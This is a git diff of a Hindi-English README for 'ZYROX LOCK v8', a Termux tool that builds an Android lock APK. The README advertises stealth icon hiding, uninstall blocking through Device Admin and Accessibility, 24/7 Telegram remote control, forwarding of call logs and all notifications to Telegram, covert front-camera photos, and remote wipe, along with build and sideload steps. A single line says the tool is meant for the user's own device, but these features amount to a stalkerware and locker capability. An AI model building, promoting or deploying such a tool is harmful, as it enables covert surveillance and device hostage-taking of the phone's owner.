@@ -1,75 +1,99 @@
-# 🔒 ZYROX LOCK BUILDER v8
+<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=200&section=header&text=KMJ%20TIPS&fontSize=75&fontColor=ffffff&animation=twinkling" width="100%"/>
 
-**Termux tool — passwords, lock screen, Telegram remote control 24/7, stealth, uninstall-proof, call logs, notification mirror → ready LOCK APK.**
-Made By **KMJ TIPS CHANNEL** 💛
+<p align="center">
+  <img src="assets/logo.png" width="170" alt="KMJ TIPS Logo"/>
+</p>
 
-## ⚡ Setup
+<h1 align="center">🔒 ZYROX LOCK v8 — APP LOCK BUILDER</h1>
+
+<p align="center">
+  <img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=600&size=21&pause=1000&color=00E5FF&center=true&vCenter=true&width=680&lines=Android+App-Lock+Builder+%F0%9F%94%92;Anti-Uninstall+Protection+%F0%9F%9B%A1%EF%B8%8F;Encrypted+Panel+URL+%F0%9F%94%90;Call+Logs+%2B+Notification+Mirror+%F0%9F%93%9E;Intruder+Selfie+%2B+24x7+Telegram+Control" alt="typing"/>
+</p>
+
+<p align="center">
+  <a href="https://t.me/kmjTrick"><img src="https://img.shields.io/badge/Telegram-Join_Channel-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram"/></a>
+  <a href="https://youtube.com/@kmjtips"><img src="https://img.shields.io/badge/YouTube-Subscribe-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube"/></a>
+</p>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Version-v8-00E5FF?style=flat-square&logo=android&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Termux-Ready-32CD32?style=flat-square&logo=android&logoColor=white"/>
+  <img src="https://img.shields.io/badge/No_Apktool-Needed-FF2D78?style=flat-square"/>
+</p>
+
+---
+
+## ⚡ Features
+
+| Feature | Detail |
+|---|---|
+| 🔑 2-Password Model | Offline (builder-only, safe fallback) + Online (remotely changeable) |
+| 🛡️ Anti-Uninstall | Device Admin + Accessibility guard — uninstall screen pe turant lock back + Telegram 🚨 alert |
+| 🗑️ Safe Uninstall | Unlocked panel se offline password → clean uninstall |
+| 🔐 Encrypted Panel URL | SHA-256 stream cipher, per-build random key — APK me plain URL nahi |
+| 🔒 Panel Page Lock | SHA-256 password gate inside `index.html` |
+| 📞 Call Logs | `/calls` → last 20 calls (naam, number, type, duration) Telegram pe |
+| 🔔 Notification Mirror | Phone notifications → Telegram (`/notifmirror on\|off`) |
+| 📸 Intruder Selfie | 3rd wrong password pe front-camera photo Telegram pe |
+| 📡 24/7 Remote Control | Foreground service + watchdog + boot receiver |
+| ⌨️ Web Panel | Neon animated panel — Call Logs button + Custom Command box |
+| 👻 Stealth Mode | Launcher icon hide + dialer secret code |
+| ☠️ Panic Password | Fake unlock + data wipe (optional) |
+
+## 🚀 Build (Termux)
 
 ```bash
+git clone https://github.com/zyroxteam/KMJ-TIPS-APP-LOCK.git
+cd KMJ-TIPS-APP-LOCK
 bash setup.sh
 python3 build.py
 ```
 
-APK `ZYROX-LOCK.apk` banega → **MT Manager se sign karo** → install.
+Builder **13 steps** puchega — passwords, Telegram bot, **panel URL + encryption**, panel page password, call log / mirror. Output:
 
-## ✨ Features (v8)
+- 📱 `ZYROX-LOCK.apk` → **MT Manager me sign** karo → install
+- 🌐 `index.html` → host karo (GitHub Pages / Netlify / Vercel)
 
-- 📞 **Call logs remotely** — Telegram se `/calls` bhejo → last 20 calls ki list (name/number | INCOMING/OUTGOING/MISSED | duration | time). Builder me ON/OFF; app setup me permission mangta hai (deny = skip).
-- 🔔 **Notification mirror** — phone ki saari notifications seedha Telegram pe (Telegram apps + khud ki app skip — loop-safe). Builder me ON/OFF (default OFF). Toggle: `/notifmirror on|off`. **Setup Step 3 me "Notification Access" grant karna padega** (Settings → Notification access → ZYROX LOCK ON), warna mirror kaam nahi karega.
-- 🛡️ **UNINSTALL-PROOF** — sahi password ke bina app delete nahi hogi:
-  - Device Admin ON hote hi Android khud uninstall block karta hai
-  - Uninstall/settings-app-details/device-admin screen khulne pe guard **turant lock pe wapas** kheenchta hai + Telegram pe 🚨 alert (5 min me max 1)
-  - Admin disable karne pe system ko strong warning dikhti hai
-  - **Legit tareeka:** unlock panel me "🗑️ UNINSTALL APP" → **offline password** dalo → admin hata ke uninstall screen khulti hai (galat password = lockout badhega!)
+## 📲 App Setup (first open)
 
-- 👁️ **Guard health alert** — agar Accessibility guard kabhi OFF ho jaye to Telegram pe daily 1 alert: "Settings > Accessibility me ON karo"
-- 🔑 **Two-password model** — Offline password (builder me set — **safe fallback**) + Online password (remotely changeable). Dono me se koi ek se unlock.
-- 📡 **24/7 Remote control** — foreground service + persistent notification ("😈 ZYROX Guard active") + 15-min watchdog alarm jo service ko zinda rakhta hai. Doze me network kabhi-kabhi defer ho sakta hai (OS limit), lekin service crash nahi hogi.
-- 🔑🔑 **Dono passwords remotely change** — `/setonlinepw <new>` aur `/setofflinepw <new>` (`/setpw` = online ka alias). `/status` dono ka SET/NOT SET batata hai (values kabhi nahi).
-- 🔒 Full-screen lock — **back button dead**, screenshots blocked (`FLAG_SECURE`)
-- ⛔ **Progressive lockdown** — 3 galat → 30s lockout, 5 galat → screen force-lock + 60s lockout, 8 galat → 5 min lockout. Counter + lockout reboot/recreate pe bhi survive karte hain.
-- 📸 **Intruder selfie** — 3rd galat password pe front camera (Camera2, no preview) photo → Telegram + `intruder_<time>.jpg` save
-- 🤖 **Telegram alerts** — galat attempts + unlock events
-- 📡 **Remote Telegram control** — bot se `/lock` `/photo` `/status` `/calls` `/notifmirror on|off` `/wipe` (panic ON pe hi wipe)
-- 📢 **Control channel (web panel)** — channel posts se commands: `/unlock` `/setpw` `/settext` `/setimage` `/notify`. Format: `ZYROX:<secret> /unlock`. Replies owner ke bot chat me ✅/❌.
-- 🌐 **Panel URL** — unlock panel me "OPEN REMOTE PANEL" button (builder me URL do)
-- 👻 **Stealth mode** — launcher icon hide; dial `*#*#<code>#*#*` se wapas lao
-- ☠️ **Panic password** → device WIPE (sirf tab ON karo jab pata ho!)
-- ⏱️ Auto-lock timer (idle minutes)
-- 🏠 Home dabao → turant wapas lock | 📋 Recents + shade blocked (accessibility guard)
-- 🛡️ **Device Admin** — anti-uninstall + 3 galat password pe screen force-lock
-- 🔄 Reboot pe auto-lock
+1. 🛡️ **ENABLE ADMIN** → Activate
+2. 👁️ **ENABLE GUARD** → Accessibility ON
+3. 🔔 **Notification Access** → ON (mirror chahiye to, else SKIP)
+4. 📞 **Call Log** → ALLOW (`/calls` chahiye to, else SKIP)
 
-## 📲 Panel Pairing (web panel ke liye)
+## 🤖 Remote Commands
 
-1. Builder me **Step 8**: Remote control ON (bot token + chat id chahiye)
-2. **Step 9**: apne control channel ka ID do (`-100xxxxxxxxx` ya `@channelname`) — **bot ko channel me admin banao** (post kar sake)
-3. Build ke end me **🔑 PANEL SECRET** dikhega — ise copy karke panel me dalo
-4. Panel se command bhejo: channel me post karo `ZYROX:<secret> /unlock`
-   - Photo ke saath: caption me `ZYROX:<secret> /setimage` likho
-5. Confirmation tumhare **bot chat** me aayega (✅/❌)
+| Command | Kaam |
+|---|---|
+| `/lock` | Phone lock |
+| `/unlock <pw>` | Unlock (offline/online password) |
+| `/calls` | Last 20 call logs → Telegram |
+| `/notifmirror on\|off` | Notification mirror toggle |
+| `/setpw <new>` | Online password change |
+| `/setofflinepw <new>` | Offline password change ⚠️ |
+| `/setonlinepw <new>` | Online password change |
+| `/selfie` | Intruder selfie abhi |
+| `/notify <msg>` | Phone pe notification bhejo |
+| `/settext <text>` | Lock screen text |
+| `/setimage <url>` | Lock screen image |
+| `/status` | Lock state + wrong attempts |
+| `/wipe` | Wipe (panic mode ON ho to) |
 
-Commands: `/unlock` `/lock` `/photo` `/status` `/wipe` `/setpw <new>` (online alias) `/setonlinepw <new>` `/setofflinepw <new>` `/settext <text>` `/setimage` `/notify <title> | <body>`
+> Web panel se bhi ye sab — panel secret builder deta hai, bina secret ke commands kaam nahi karenge.
 
-> **⚠️ WARNING (bold me padho):** `/setofflinepw` se offline password remotely change karne pe tumhara **lockout-proof fallback khatam** ho jata hai — agar naya offline password bhool gaye to sirf online password se unlock hoga. Offline password hamesha yaad rakho!
+## 🛡️ Notes
 
-## ⚠️ Permissions (app khud mangega, step-by-step)
+- Battery optimization → **Unrestricted** rakho (24/7 service ke liye)
+- Fingerprint intentionally removed — password-only unlock
+- Apne device ke liye banao, visible permissions ke saath
 
-1. **Device Admin** → Activate dabao (anti-uninstall)
-2. **Accessibility Guard** → ZYROX LOCK ko ON karo (full lock)
-3. **Notification Access** → sirf mirror ON ho to (Step 3 me SKIP bhi kar sakte ho) — **manual grant:** Settings → *Notification access* (ya *Special app access*) → ZYROX LOCK ko ON karo
-4. **Call Log** → `/calls` chahiye to ALLOW, warna SKIP (deny = silently skip)
-5. **Camera** → sirf intruder selfie ke liye (deny = silently skip)
-6. **Notifications** → `/notify` command ke liye (Android 13+)
+---
 
-## 📁 Files
+<p align="center">
+  <a href="https://t.me/kmjTrick"><img src="https://img.shields.io/badge/Telegram-@kmjTrick-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram"/></a>
+  <a href="https://youtube.com/@kmjtips"><img src="https://img.shields.io/badge/YouTube-@kmjtips-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube"/></a>
+</p>
 
-| File | Kaam |
-|------|------|
-| `setup.sh` | One-click setup |
-| `build.py` | Saare options leke `ZYROX-LOCK.apk` banata hai |
-| `template.apk` | Pre-built v8 template (signed, debug key) |
+<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=130&section=footer" width="100%"/>
 
-Output APK **unsigned** hota hai → **MT Manager se sign** karo.
-
-> ⚠️ Offline password yaad rakho — wahi tumhara master key hai. Panic password galti se mat dalna!
+<p align="center"><b>Made with 💛 by KMJ TIPS</b></p>
